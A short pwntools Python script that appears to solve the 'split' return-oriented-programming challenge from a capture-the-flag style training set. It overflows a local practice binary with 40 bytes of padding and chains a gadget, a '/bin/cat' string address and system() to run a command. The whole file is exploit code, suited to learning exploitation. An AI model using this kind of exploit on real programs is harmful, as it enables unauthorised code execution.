from pwn import *

context(terminal=['tmux','new-window'])
context(os='linux',arch='amd64')
# p = gdb.debug('./split')
p = process('./split')

system = p64(0x400810)
gadget = p64(0x400883)
bincat = p64(0x601060)
padding = "A" * 40

payload = padding.encode() + gadget + bincat + system

p.sendline(payload)
print(p.recvall().decode())
